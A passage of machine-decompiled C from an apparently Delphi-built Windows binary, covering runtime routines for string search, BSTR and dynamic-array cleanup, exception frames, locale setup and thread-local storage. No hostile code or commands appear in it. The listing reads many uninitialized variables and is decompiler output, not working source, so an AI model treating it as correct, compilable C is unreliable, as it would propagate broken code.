        return 0;
    }
    uint32_t v3 = *(int32_t *)(v1 - 4); // 0x40381b
    int32_t v4 = *(int32_t *)(v2 - 4) - 1; // 0x403822
    if (v4 < 0 || v3 <= v4) {
        // 0x403845
        return 0;
    }
    // 0x40382c
    int32_t v5; // bp-16, 0x40380c
    int32_t v6 = &v5; // 0x40381e
    int32_t v7 = v3 - v4; // 0x403828
    bool v8; // 0x40380c
    int32_t v9 = v8 ? -1 : 1;
    int32_t * v10 = (int32_t *)(v6 - 4);
    bool v11 = v7 == 0; // 0x40380c
    int32_t v12 = v7; // 0x40380c
    int32_t v13 = v2 + 1; // 0x403839
    int32_t result; // 0x40380c
    while (true) {
        // 0x40382c
        int32_t v14; // 0x40380c
        int32_t v15 = v14;
        int32_t v16 = v15; // 0x40382c
        int32_t v17 = v12; // 0x40382c
        int32_t v18; // 0x40380c
        if (v12 == 0) {
            // ._crit_edge
            v18 = v15;
            v12 = 0;
            result = 0;
            if (!v11) {
                // break -> 0x403845
                break;
            }
        } else {
            int32_t v19 = v16 + v9; // 0x40382c
            int32_t v20 = v17 - 1; // 0x40382c
            v18 = v19;
            v12 = v20;
            while (*(char *)v16 != (char)v2) {
                // .lr.ph
                v16 = v19;
                result = 0;
                if (v20 == 0) {
                    return result;
                }
                v19 = v16 + v9;
                v20--;
                v18 = v19;
                v12 = v20;
            }
        }
        int32_t v21 = v18; // 0x403838
        *v10 = v13;
        *(int32_t *)(v6 - 8) = v21;
        int32_t v22 = v4; // 0x403836
        int32_t v23 = v21; // 0x403836
        if (v22 == 0) {
            // 0x403848
            result = v21 - v5;
            return result;
        }
        int32_t v24 = v13;
        char v25 = *(char *)v23; // 0x403836
        v22--;
        int32_t v26 = v24 + v9; // 0x403836
        v23 += v9;
        while (*(char *)v24 == v25) {
            if (v22 == 0) {
                // 0x403848
                result = v21 - v5;
                return result;
            }
            v24 = v26;
            v25 = *(char *)v23;
            v22--;
            v26 = v24 + v9;
            v23 += v9;
        }
        // 0x40383c
        v13 = *v10;
        v11 = false;
        v14 = v21;
    }
  lab_0x403845:
    // 0x403845
    return result;
}

// Address range: 0x403854 - 0x4038b6
int32_t function_403854(void) {
    int32_t v1 = 0; // 0x40385f
    uint32_t v2; // 0x403854
    int32_t v3; // 0x403854
    if (v2 >= 1) {
        if (v3 != 0) {
            // 0x403867
            if (*(int32_t *)(v3 - 8) == 1) {
                // 0x40386d
                function_4024f8();
                *(char *)(v3 + v2) = 0;
                // 0x4038b2
                int32_t result; // 0x403854
                return result;
            }
        }
        int32_t v4 = function_403408(); // 0x40388c
        v1 = 0;
        if (v4 != 0) {
            // 0x403899
            function_4025bc();
            v1 = v4;
        }
    }
    int32_t result2 = function_403370(); // 0x4038ab
    *(int32_t *)v3 = v1;
    // 0x4038b2
    return result2;
}

// Address range: 0x4038b8 - 0x4038bf
int32_t function_4038b8(void) {
    // 0x4038b8
    return function_4025a0((int32_t)&g111);
}

// Address range: 0x4038bf - 0x4038c0
int32_t function_4038bf(void) {
    // 0x4038bf
    int32_t result; // 0x4038bf
    return result;
}

// Address range: 0x4038c0 - 0x4038d5
int32_t function_4038c0(void) {
    // 0x4038c0
    int32_t result; // 0x4038c0
    if (result != 0) {
        // 0x4038c6
        *(int32_t *)result = 0;
        SysFreeString((int16_t *)result);
    }
    // 0x4038d4
    return result;
}

// Address range: 0x4038d8 - 0x4038f9
int32_t function_4038d8(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4038d8
    int32_t v1; // bp-8, 0x4038d8
    int32_t v2 = &v1;
    int32_t v3; // 0x4038d8
    int32_t * v4 = (int32_t *)v3; // 0x4038de
    int32_t v5 = *v4; // 0x4038de
    int32_t result = 0; // 0x4038e2
    int32_t v6 = v2; // 0x4038e2
    if (v5 != 0) {
        // 0x4038e4
        *v4 = 0;
        v6 = v2 - 4;
        *(int32_t *)v6 = v5;
        SysFreeString((int16_t *)&g111);
        result = &g111;
    }
    // 0x4038f0
    int32_t v7; // 0x4038d8
    int32_t v8 = v7 - 1; // 0x4038f3
    v3 += 4;
    while (v8 != 0) {
        // 0x4038de
        v2 = v6;
        v4 = (int32_t *)v3;
        v5 = *v4;
        result = 0;
        v6 = v2;
        if (v5 != 0) {
            // 0x4038e4
            *v4 = 0;
            v6 = v2 - 4;
            *(int32_t *)v6 = v5;
            SysFreeString((int16_t *)&g111);
            result = &g111;
        }
        // 0x4038f0
        v8--;
        v3 += 4;
    }
    // 0x4038f6
    return result;
}

// Address range: 0x4038fc - 0x403920
int32_t function_4038fc(void) {
    // 0x4038fc
    int32_t v1; // 0x4038fc
    int32_t v2; // 0x4038fc
    if (v2 == 0) {
        v1 = function_4038c0();
    }
    uint32_t v3 = *(int32_t *)(v2 - 4); // 0x403904
    int32_t v4 = v1; // 0x403909
    if (v3 < 2) {
        v4 = function_4038c0();
    }
    int32_t result = SysReAllocStringLen((int16_t **)(v3 / 2), (int16_t *)v2, v4); // 0x403912
    if (result != 0) {
        // 0x40391f
        return result;
    }
    function_4038b8();
    // UNREACHABLE
}

// Address range: 0x403920 - 0x403951
int32_t function_403920(void) {
    int32_t v1; // 0x403920
    for (uint32_t i = *(int32_t *)(v1 + 6 + (int32_t)*(char *)(v1 + 1)); i >= 1; i--) {
        // 0x403932
        function_40396c();
    }
    // 0x40394b
    int32_t result; // 0x403920
    return result;
}

// Address range: 0x403954 - 0x40396b
int32_t function_403954(void) {
    // 0x403954
    if (g11 != 0) {
        // 0x40395d
        int32_t result; // 0x403954
        return result;
    }
    // 0x403964
    function_4025a0((int32_t)&g111);
    // UNREACHABLE
}

// Address range: 0x40396b - 0x40396c
int32_t function_40396b(void) {
    // 0x40396b
    int32_t result; // 0x40396b
    return result;
}

// Address range: 0x40396c - 0x403a56
int32_t function_40396c(void) {
    // 0x40396c
    int32_t v1; // 0x40396c
    int32_t result; // 0x40396c
    if (v1 == 0) {
        // 0x403a55
        return result;
    }
    int32_t v2; // 0x40396c
    switch ((char)v2) {
        case 10: {
            if (v1 > 1) {
                // 0x4039c0
                function_403394();
            } else {
                // 0x4039b6
                function_403370();
            }
            // 0x403a55
            return result;
        }
        case 11: {
            if (v1 > 1) {
                // 0x4039da
                int32_t v3; // 0x40396c
                int32_t v4; // 0x40396c
                int32_t v5; // 0x40396c
                function_4038d8(result, v5, v4, v3);
            } else {
                // 0x4039d3
                function_4038c0();
            }
            // 0x403a55
            return result;
        }
        case 12: {
            int32_t v6; // 0x40396c
            uint32_t v7 = v6;
            function_403954();
            v6 = v7 - 1;
            while (v7 > 1) {
                // 0x4039e3
                v7 = v6;
                function_403954();
                v6 = v7 - 1;
            }
            // 0x403a55
            return result;
        }
        case 13: {
            int32_t v8; // 0x40396c
            uint32_t v9 = v8;
            function_40396c();
            v8 = v9 - 1;
            while (v9 > 1) {
                // 0x4039f5
                v9 = v8;
                function_40396c();
                v8 = v9 - 1;
            }
            // 0x403a55
            return result;
        }
        case 14: {
            int32_t v10; // 0x40396c
            uint32_t v11 = v10;
            function_403920();
            v10 = v11 - 1;
            while (v11 > 1) {
                // 0x403a13
                v11 = v10;
                function_403920();
                v10 = v11 - 1;
            }
            // 0x403a55
            return result;
        }
        case 15: {
            int32_t v12; // 0x40396c
            uint32_t v13 = v12;
            function_403f90();
            v12 = v13 - 1;
            while (v13 > 1) {
                // 0x403a26
                v13 = v12;
                function_403f90();
                v12 = v13 - 1;
            }
            // 0x403a55
            return result;
        }
        case 17: {
            int32_t v14; // 0x40396c
            uint32_t v15 = v14;
            function_403e50();
            v14 = v15 - 1;
            while (v15 > 1) {
                // 0x403a35
                v15 = v14;
                function_403e50();
                v14 = v15 - 1;
            }
            // 0x403a55
            return result;
        }
    }
    // 0x403a46
    function_4025a0(result);
    // UNREACHABLE
}

// Address range: 0x403a58 - 0x403a6f
int32_t function_403a58(void) {
    // 0x403a58
    if (g12 != 0) {
        // 0x403a61
        int32_t result; // 0x403a58
        return result;
    }
    // 0x403a68
    function_4025a0((int32_t)&g111);
    // UNREACHABLE
}

// Address range: 0x403a6f - 0x403a70
int32_t function_403a6f(void) {
    // 0x403a6f
    int32_t result; // 0x403a6f
    return result;
}

// Address range: 0x403a70 - 0x403b8a
int32_t function_403a70(void) {
    // 0x403a70
    int32_t v1; // 0x403a70
    int32_t v2 = v1 + 10 + (int32_t)*(char *)(v1 + 1); // 0x403a7d
    int32_t v3 = *(int32_t *)(v2 - 8); // bp-20, 0x403a89
    int32_t result = 0; // 0x403a89
    int32_t v4 = &v3; // 0x403a89
    int32_t v5 = *(int32_t *)(v2 - 4); // 0x403a89
    int32_t v6 = v2; // 0x403a89
    while (true) {
        int32_t v7 = v4;
        int32_t * v8 = (int32_t *)(v6 + 4); // 0x403a8a
        if (*v8 > result) {
            // 0x403a91
            function_4025bc();
        }
        int32_t v9 = *(int32_t *)*(int32_t *)v6; // 0x403aa1
        int32_t v10; // 0x403a70
        int32_t v11; // 0x403a70
        switch (*(char *)v9) {
            case 10: {
                // 0x403adb
                function_4033c4();
                v10 = 4;
                v11 = v7;
                // break -> 0x403b69
                break;
            }
            case 11: {
                // 0x403aec
                function_4038fc();
                v10 = 4;
                v11 = v7;
                // break -> 0x403b69
                break;
            }
            case 12: {
                // 0x403afd
                function_403a58();
                v10 = 16;
                v11 = v7;
                // break -> 0x403b69
                break;
            }
            case 13: {
                int32_t v12 = (int32_t)*(char *)(v9 + 1); // 0x403b10
                int32_t v13 = v7 - 4; // 0x403b13
                *(int32_t *)v13 = *(int32_t *)(v9 + 2 + v12);
                int32_t * v14 = (int32_t *)(v7 - 8); // 0x403b17
                *v14 = *(int32_t *)(v9 + v12 + 6);
                function_403b8c((int32_t)&g111);
                v10 = *v14;
                v11 = v13;
                // break -> 0x403b69
                break;
            }
            case 14: {
                int32_t * v15 = (int32_t *)(v7 - 4); // 0x403b37
                *v15 = *(int32_t *)(v9 + 2 + (int32_t)*(char *)(v9 + 1));
                function_403a70();
                v10 = *v15;
                v11 = v7;
                // break -> 0x403b69
                break;
            }
            case 15: {
                // 0x403b47
                function_403fa8();
                v10 = 4;
                v11 = v7;
                // break -> 0x403b69
                break;
            }
            case 17: {
                // 0x403b58
                function_403e8c();
                v10 = 4;
                v11 = v7;
                // break -> 0x403b69
                break;
            }
            default: {
                // 0x403ad0
                function_4025a0((int32_t)&g111);
                // UNREACHABLE
            }
        }
        // 0x403b69
        v4 = v11;
        result = *v8 + v10;
        v5--;
        v6 += 8;
        if (v5 == 0) {
            // 0x403b76
            if (*(int32_t *)v4 > result) {
                // 0x403b85
                return function_4025bc();
            }
            // 0x403b85
            return result;
        }
    }
    // 0x403ad0
    function_4025a0((int32_t)&g111);
    // UNREACHABLE
}

// Address range: 0x403b8c - 0x403c7e
int32_t function_403b8c(int32_t a1) {
    int32_t v1 = a1; // 0x403be1
    int32_t v2 = a1; // 0x403bf8
    int32_t v3 = a1; // 0x403c0c
    int32_t v4 = a1; // 0x403c4a
    int32_t v5 = a1; // 0x403c5e
    int32_t v6 = a1; // 0x403c74
    int32_t result; // 0x403b8c
    int32_t result2; // 0x403c24
    int32_t v7; // 0x403b8c
    switch ((char)v7) {
        case 10: {
            v1--;
            result = function_4033c4();
            while (v1 != 0) {
                // 0x403bd2
                v1--;
                result = function_4033c4();
            }
            // 0x403c77
            return result;
        }
        case 11: {
            v2--;
            result = function_4038fc();
            while (v2 != 0) {
                // 0x403be9
                v2--;
                result = function_4038fc();
            }
            // 0x403c77
            return result;
        }
        case 12: {
            v3--;
            result = function_403a58();
            while (v3 != 0) {
                // 0x403bfd
                v3--;
                result = function_403a58();
            }
            // 0x403c77
            return result;
        }
        case 13: {
            unsigned char v8 = *(char *)(v7 + 1); // 0x403c13
            int32_t v9; // bp-16, 0x403b8c
            int32_t v10 = &v9; // 0x403c16
            int32_t v11 = a1; // 0x403c16
            v10 -= 4;
            *(int32_t *)v10 = *(int32_t *)(v7 + 6 + (int32_t)v8);
            result2 = function_403b8c((int32_t)&g111);
            v11--;
            while (v11 != 0) {
                // 0x403c1a
                v10 -= 4;
                *(int32_t *)v10 = *(int32_t *)(v7 + 6 + (int32_t)v8);
                result2 = function_403b8c((int32_t)&g111);
                v11--;
            }
            // break -> 0x403c77
            break;
        }
        case 14: {
            function_403a70();
            v4--;
            while (v4 != 0) {
                // 0x403c32
                function_403a70();
                v4--;
            }
            // 0x403c77
            return (int32_t)*(char *)(v7 + 1);
        }
        case 15: {
            v5--;
            result = function_403fa8();
            while (v5 != 0) {
                // 0x403c4f
                v5--;
                result = function_403fa8();
            }
            // 0x403c77
            return result;
        }
        case 17: {
            v6--;
            result = function_403e8c();
            while (v6 != 0) {
                // 0x403c63
                v6--;
                result = function_403e8c();
            }
            // 0x403c77
            return result;
        }
        default: {
            // 0x403bc7
            int32_t v12; // 0x403b8c
            function_4025a0(v12);
            // UNREACHABLE
        }
    }
    // 0x403c77
    return result2;
}

// Address range: 0x403c7e - 0x403c7f
int32_t function_403c7e(void) {
    // 0x403c7e
    int32_t result; // 0x403c7e
    return result;
}

// Address range: 0x403c80 - 0x403c87
int32_t function_403c80(void) {
    // 0x403c80
    return function_4025a0((int32_t)&g111);
}

// Address range: 0x403c87 - 0x403c88
int32_t function_403c87(void) {
    // 0x403c87
    int32_t result; // 0x403c87
    return result;
}

// Address range: 0x403c88 - 0x403c90
int32_t function_403c88(void) {
    int32_t result = 0; // 0x403c8a
    int32_t v1; // 0x403c88
    if (v1 != 0) {
        // 0x403c8c
        result = *(int32_t *)(v1 - 4);
    }
    // 0x403c8f
    return result;
}

// Address range: 0x403c90 - 0x403c97
int32_t function_403c90(void) {
    // 0x403c90
    return function_403c88() - 1;
}

// Address range: 0x403c98 - 0x403ca7
int32_t function_403c98(int32_t a1) {
    // 0x403c98
    int32_t v1; // 0x403c98
    return function_403b8c(v1);
}

// Address range: 0x403ca8 - 0x403cad
int32_t function_403ca8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    // 0x403ca8
    return function_40396c();
}

// Address range: 0x403cad - 0x403cae
int32_t function_403cad(void) {
    // 0x403cad
    int32_t result; // 0x403cad
    return result;
}

// Address range: 0x403cb0 - 0x403cb6
int32_t function_403cb0(int32_t a1, int32_t a2) {
    // 0x403cb0
    return function_403e50();
}

// Address range: 0x403cb8 - 0x403e44
int32_t function_403cb8(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x403cd1
    int32_t v2; // 0x403cb8
    int32_t v3; // 0x403cb8
    if (v1 >= 0 != v1 != 0) {
        if (v1 >= 0) {
            // 0x403e3b
            return function_403cb0(v2, v3);
        }
        // 0x403cdb
        function_4025a0(v2);
        // UNREACHABLE
    }
    int32_t v4 = 0; // 0x403cf8
    int32_t v5 = 0; // 0x403cf8
    int32_t v6; // 0x403cb8
    if (v6 != 0) {
        // 0x403cfa
        v4 = *(int32_t *)(v6 - 4);
        v5 = v6 - 8;
    }
    int32_t v7 = v4;
    int32_t v8; // 0x403cb8
    int32_t v9 = v8 + (int32_t)*(char *)(v8 + 1); // 0x403d0a
    int32_t v10 = *(int32_t *)(v9 + 2); // 0x403d0e
    int32_t v11 = *(int32_t *)(v9 + 6); // 0x403d14
    int32_t v12 = 0; // 0x403d19
    if (v11 != 0) {
        // 0x403d1b
        v12 = *(int32_t *)v11;
    }
    int32_t v13 = v10 * v1; // 0x403d23
    if (v10 != (int32_t)((0x100000000 * (int64_t)(v13 >> 31) | (int64_t)v13) / (int64_t)v1)) {
        // 0x403d34
        function_4025a0(v2);
        // UNREACHABLE
    }
    // 0x403d3b
    int32_t v14; // bp-48, 0x403cb8
    int32_t v15 = &v14; // 0x403cc0
    int32_t v16; // 0x403cb8
    int32_t v17; // 0x403cb8
    if (v5 == 0) {
        goto lab_0x403d48;
    } else {
        int32_t * v18 = (int32_t *)v5; // 0x403d43
        int32_t v19 = *v18; // 0x403d43
        if (v19 != 1) {
            // 0x403d7d
            *v18 = v19 - 1;
            int32_t v20 = function_4024b8(); // 0x403d82
            if (v12 == 0) {
                // 0x403dc5
                function_4025bc();
                v16 = v20;
                v17 = v15;
            } else {
                int32_t v21 = v1 < v7 ? v1 : v7;
                function_402720();
                int32_t v22 = v21; // bp-52, 0x403db1
                function_403c98(v21);
                v16 = v20;
                v17 = &v22;
            }
            goto lab_0x403ddb;
        } else {
            goto lab_0x403d48;
        }
    }
  lab_0x403d48:
    if (v1 < v7 && v12 != 0) {
        // 0x403d54
        int32_t v23; // 0x403cb8
        int32_t v24; // 0x403cb8
        int32_t v25; // 0x403cb8
        function_403ca8(v2, v3, v7, v10, v13 + 8, v5, v25, v24, v23);
    }
    // 0x403d6d
    function_4024f8();
    v16 = v5;
    v17 = v15;
    goto lab_0x403ddb;
  lab_0x403ddb:
    // 0x403ddb
    *(int32_t *)v16 = 1;
    *(int32_t *)(v16 + 4) = v1;
    function_402720();
    int32_t result; // 0x403cb8
    if (v3 < 2) {
        // 0x403e36
        *(int32_t *)v6 = v16 + 8;
        // 0x403e3b
        return result;
    }
    int32_t v26 = 0; // 0x403e12
    if (v1 < 1) {
        // 0x403e36
        *(int32_t *)v6 = v16 + 8;
        // 0x403e3b
        return result;
    }
    int32_t v27 = v17 - 4; // 0x403e1f
    *(int32_t *)v27 = a1 + 4;
    function_403cb8(v26);
    int32_t v28 = v1 - 1; // 0x403e33
    v26++;
    int32_t v29 = v27; // 0x403e34
    int32_t v30 = v28; // 0x403e34
    while (v28 != 0) {
        // 0x403e1c
        v27 = v29 - 4;
        *(int32_t *)v27 = a1 + 4;
        function_403cb8(v26);
        v28 = v30 - 1;
        v26++;
        v29 = v27;
        v30 = v28;
    }
    // 0x403e36
    *(int32_t *)v6 = v16 + 8;
    // 0x403e3b
    return result;
}

// Address range: 0x403e44 - 0x403e4f
int32_t function_403e44(void) {
    // 0x403e44
    int32_t v1; // 0x403e44
    return function_403cb8((int32_t)&v1 + 4);
}

// Address range: 0x403e50 - 0x403e8a
int32_t function_403e50(void) {
    // 0x403e50
    int32_t result; // 0x403e50
    if (result == 0) {
        // 0x403e89
        return result;
    }
    // 0x403e56
    *(int32_t *)result = 0;
    int32_t * v1 = (int32_t *)(result - 8); // 0x403e5c
    int32_t v2 = *v1 - 1; // 0x403e5c
    *v1 = v2;
    if (v2 != 0) {
        // 0x403e89
        return result;
    }
    // 0x403e62
    int32_t v3; // 0x403e50
    if (*(int32_t *)(v3 + 6 + (int32_t)*(char *)(v3 + 1)) != 0) {
        // 0x403e72
        if (*(int32_t *)(result - 4) != 0) {
            // 0x403e79
            function_40396c();
        }
    }
    // 0x403e80
    function_4024d8();
    // 0x403e89
    return result;
}

// Address range: 0x403e8c - 0x403eb3
int32_t function_403e8c(void) {
    // 0x403e8c
    int32_t v1; // 0x403e8c
    if (v1 != 0) {
        int32_t * v2 = (int32_t *)(v1 - 8); // 0x403e93
        *v2 = *v2 + 1;
    }
    int32_t result; // 0x403e8c
    if (result == 0) {
        // 0x403eaf
        return result;
    }
    int32_t * v3 = (int32_t *)(result - 8); // 0x403e9b
    int32_t v4 = *v3; // 0x403e9b
    int32_t v5 = v4 - 1; // 0x403e9b
    *v3 = v5;
    if (v5 == 0) {
        // 0x403ea1
        *v3 = v4;
        function_403e50();
    }
    // 0x403eaf
    return result;
}

// Address range: 0x403eb4 - 0x403f0e
int32_t function_403eb4(void) {
    // 0x403eb4
    if (g18 == 0) {
        // 0x403f07
        return 0;
    }
    // 0x403ece
    int32_t v1; // bp-24, 0x403eb4
    int32_t v2 = &v1; // 0x403ebc
    int32_t v3 = v2 - 12;
    int32_t * v4 = (int32_t *)v3;
    int32_t result = g18; // 0x403efc
    int32_t v5; // bp-4, 0x403eb4
    *(int32_t *)(v2 - 4) = (int32_t)&v5;
    *(int32_t *)(v2 - 8) = 0x403eef;
    *v4 = __readfsdword(0);
    __writefsdword(0, v3);
    __writefsdword(0, *v4);
    result = *(int32_t *)result;
    while (result != 0) {
        // 0x403ece
        *(int32_t *)(v2 - 4) = (int32_t)&v5;
        *(int32_t *)(v2 - 8) = 0x403eef;
        *v4 = __readfsdword(0);
        __writefsdword(0, v3);
        __writefsdword(0, *v4);
        result = *(int32_t *)result;
    }
    // 0x403f07
    return result;
}

// Address range: 0x403f10 - 0x403f1e
int32_t function_403f10(void) {
    // 0x403f10
    int32_t result; // 0x403f10
    *(int32_t *)result = g17;
    return result;
}

// Address range: 0x403f20 - 0x403f84
int32_t function_403f20(void) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x403f2f
    __writefsdword(0, (int32_t)&v1);
    function_403eb4();
    __writefsdword(0, v1);
    int32_t result; // 0x403f20
    int32_t v2; // 0x403f20
    if (v2 == g17) {
        // 0x403f83
        return result;
    }
    // 0x403f64
    if (g17 == 0) {
        // 0x403f83
        return 0;
    }
    int32_t result2 = g17;
    int32_t * v3 = (int32_t *)result2;
    int32_t v4 = *v3; // 0x403f6d
    while (v4 != v2) {
        // 0x403f7d
        result = v4;
        if (v4 == 0) {
            // 0x403f83
            return result;
        }
        result2 = v4;
        v3 = (int32_t *)result2;
        v4 = *v3;
    }
    // 0x403f74
    *v3 = result2;
    // 0x403f83
    return result2;
}

// Address range: 0x403f84 - 0x403f89
int32_t function_403f84(void) {
    // 0x403f84
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x403f89 - 0x403f8b
int32_t function_403f89(void) {
    // 0x403f89
    int32_t result; // 0x403f89
    return result;
}

// Address range: 0x403f8b - 0x403f8e
int32_t function_403f8b(int32_t a1, int32_t a2) {
    // 0x403f8b
    int32_t result; // 0x403f8b
    return result;
}

// Address range: 0x403f90 - 0x403fa5
int32_t function_403f90(void) {
    // 0x403f90
    int32_t result; // 0x403f90
    if (result != 0) {
        // 0x403f96
        *(int32_t *)result = 0;
    }
    // 0x403fa4
    return result;
}

// Address range: 0x403fa8 - 0x403fd4
int32_t function_403fa8(void) {
    // 0x403fa8
    int32_t result; // 0x403fa8
    if (result != 0) {
        // 0x403fac
        return result;
    }
    // 0x403fc5
    int32_t result2; // 0x403fa8
    *(int32_t *)result2 = 0;
    return result2;
}

// Address range: 0x403fd4 - 0x40403a
int32_t function_403fd4(void) {
    int32_t v1 = __readfsdword(0); // bp-36, 0x403fe8
    __writefsdword(0, (int32_t)&v1);
    int32_t LCType; // bp-15, 0x403fd4
    int32_t cchData; // 0x403fd4
    GetLocaleInfoA(7, (int32_t)&LCType, (char *)0x1004, cchData);
    function_4034b0();
    function_4027ac();
    __writefsdword(0, cchData);
    return function_403370();
}

// Address range: 0x40403a - 0x40403f
int32_t function_40403a(void) {
    // 0x40403a
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x40403f - 0x404041
int32_t function_40403f(void) {
    // 0x40403f
    int32_t result; // 0x40403f
    return result;
}

// Address range: 0x404041 - 0x404048
int32_t function_404041(int32_t a1) {
    // 0x404041
    int32_t result; // 0x404041
    return result;
}

// Address range: 0x404048 - 0x404092
int32_t function_404048(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404053
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g60 + 1; // 0x404059
    g60 = v2;
    if (v2 == 0) {
        // 0x404061
        function_40263c();
        function_40263c();
        function_40263c();
        function_4018bc();
    }
    // 0x404084
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404092 - 0x404097
int32_t function_404092(void) {
    // 0x404092
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404097 - 0x404099
int32_t function_404097(void) {
    // 0x404097
    int32_t result; // 0x404097
    return result;
}

// Address range: 0x404099 - 0x40409b
int32_t function_404099(int32_t a1) {
    // 0x404099
    int32_t result; // 0x404099
    return result;
}

// Address range: 0x40409c - 0x40416f
int32_t function_40409c(void) {
    int32_t v1 = g60; // 0x40409c
    g60 = v1 - 1;
    if (v1 != 0) {
        // 0x40416e
        int32_t result; // 0x40409c
        return result;
    }
    // 0x4040a9
    *(char *)&g10 = 2;
    g43 = 0x401068;
    g44 = 0x401070;
    *(char *)&g53 = 2;
    g41 = 0x403c80;
    if ((char)function_4028b8() != 0) {
        // 0x4040de
        function_4028e8();
    }
    // 0x4040e3
    *(int16_t *)&g55 = -0x2850;
    g56 = -0x2850;
    *(int16_t *)&g57 = -0x2850;
    g49 = (int32_t)GetCommandLineA();
    g48 = function_401108();
    if (GetVersion() < 0) {
        // 0x404155
        GetThreadLocale();
        g61 = function_403fd4();
    } else {
        // 0x404128
        if ((GetVersion() & 255) < 5) {
            // 0x404144
            GetThreadLocale();
            g61 = function_403fd4();
        } else {
            // 0x404138
            g61 = 3;
        }
    }
    int32_t threadId = GetCurrentThreadId(); // 0x404164
    g46 = threadId;
    // 0x40416e
    return threadId;
}

// Address range: 0x404170 - 0x404176
int32_t function_404170(int32_t a1, int32_t a2) {
    // 0x404170
    return LocalAlloc2();
}

// Address range: 0x404178 - 0x40417e
int32_t function_404178(int32_t a1) {
    // 0x404178
    return LocalFree2();
}

// Address range: 0x404180 - 0x404186
int32_t function_404180(void) {
    // 0x404180
    return TlsAlloc();
}

// Address range: 0x404188 - 0x40418e
bool function_404188(int32_t dwTlsIndex) {
    // 0x404188
    return TlsFree(dwTlsIndex);
}

// Address range: 0x404190 - 0x404196
int32_t * function_404190(int32_t dwTlsIndex) {
    // 0x404190
    return TlsGetValue(dwTlsIndex);
}

// Address range: 0x404198 - 0x40419e
bool function_404198(int32_t dwTlsIndex, int32_t * lpTlsValue) {
    // 0x404198
    return TlsSetValue(dwTlsIndex, lpTlsValue);
}

// Address range: 0x4041a0 - 0x4041a9
int32_t function_4041a0(void) {
    // 0x4041a0
    int32_t v1; // 0x4041a0
    return function_404170(v1, 64);
}

// Address range: 0x4041ac - 0x4041b2
int32_t function_4041ac(int32_t a1) {
    // 0x4041ac
    return 8;
}

// Address range: 0x4041b4 - 0x4041f8
int32_t function_4041b4(void) {
    // 0x4041b4
    int32_t v1; // 0x4041b4
    if (function_4041ac(v1) == 0) {
        // 0x4041f6
        return 0;
    }
    // 0x4041c0
    if (g20 == -1) {
        // 0x4041c9
        function_403364((int32_t)&g111);
        // UNREACHABLE
    }
    int32_t dwTlsIndex = function_4041a0(); // 0x4041d5
    if (dwTlsIndex != 0) {
        // 0x4041f6
        return TlsSetValue(dwTlsIndex, (int32_t *)g20);
    }
    // 0x4041de
    function_403364((int32_t)&g111);
    // UNREACHABLE
}

// Address range: 0x4041f8 - 0x404221
int32_t function_4041f8(void) {
    // 0x4041f8
    g20 = TlsAlloc();
    function_4041b4();
    int32_t result = (int32_t)TlsGetValue(g20); // 0x404216
    g86 = result;
    return result;
}

// Address range: 0x404224 - 0x40424c
int32_t function_404224(void) {
    // 0x404224
    if (g20 == -1) {
        // 0x40424b
        return 8;
    }
    int32_t * v1 = TlsGetValue(g20); // 0x40423c
    int32_t v2 = (int32_t)v1; // 0x40423c
    int32_t result = v2; // 0x404243
    if (v1 != NULL) {
        // 0x404245
        result = function_404178(v2);
    }
    // 0x40424b
    return result;
}

// Address range: 0x40424c - 0x40426f
int32_t function_40424c(void) {
    int32_t result = function_404224(); // 0x404261
    if (g20 != -1) {
        // 0x404263
        result = TlsFree(g20);
    }
    // 0x40426e
    return result;
}

// Address range: 0x404270 - 0x4042b0
int32_t function_404270(void) {
    // 0x404270
    if (g82 == 0) {
        // 0x40427f
        return *(int32_t *)(__readfsdword(44) + 4 * g20);
    }
    int32_t * v1 = TlsGetValue(g20); // 0x4042a6
    if (v1 != NULL) {
        // 0x4042af
        return (int32_t)v1;
    }
    // 0x40428a
    function_4041b4();
    int32_t * v2 = TlsGetValue(g20); // 0x404295
    if (v2 == NULL) {
        // 0x40429f
        return g86;
    }
    // 0x40429e
    return (int32_t)v2;
}

// Address range: 0x4042b0 - 0x4042bb
int32_t function_4042b0(int32_t a1, int32_t a2) {
    // 0x4042b0
    return function_403f10();
}

// Address range: 0x4042bc - 0x404302
int32_t function_4042bc(int32_t a1) {
    // 0x4042bc
    int32_t v1; // 0x4042bc
    if (*(int32_t *)(v1 + 12) == 1) {
        // 0x4042c7
        g82 = 1;
        int32_t v2 = *(int32_t *)(v1 + 8); // 0x4042d0
        g83 = (int32_t (*)(int32_t, int32_t, int32_t))v2;
        g22 = v2;
        g23 = 0;
        g24 = 0;
        int32_t v3; // 0x4042bc
        function_4042b0(v3, (int32_t)&g21);
    }
    // 0x4042f1
    return function_4030a0(g84);
}

// Address range: 0x404304 - 0x404329
int32_t function_404304(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40430f
    __writefsdword(0, (int32_t)&v1);
    g85++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404329 - 0x40432e
int32_t function_404329(void) {
    // 0x404329
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x40432e - 0x404330
int32_t function_40432e(void) {
    // 0x40432e
    int32_t result; // 0x40432e
    return result;
}

// Address range: 0x404330 - 0x404332
int32_t function_404330(int32_t a1) {
    // 0x404330
    int32_t result; // 0x404330
    return result;
}

// Address range: 0x404334 - 0x40433c
int32_t function_404334(void) {
    // 0x404334
    g85--;
    int32_t result; // 0x404334
    return result;
}

// Address range: 0x40433c - 0x404361
int32_t function_40433c(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404347
    __writefsdword(0, (int32_t)&v1);
    g87++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404361 - 0x404366
int32_t function_404361(void) {
    // 0x404361
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404366 - 0x404368
int32_t function_404366(void) {
    // 0x404366
    int32_t result; // 0x404366
    return result;
}

// Address range: 0x404368 - 0x40436a
int32_t function_404368(int32_t a1) {
    // 0x404368
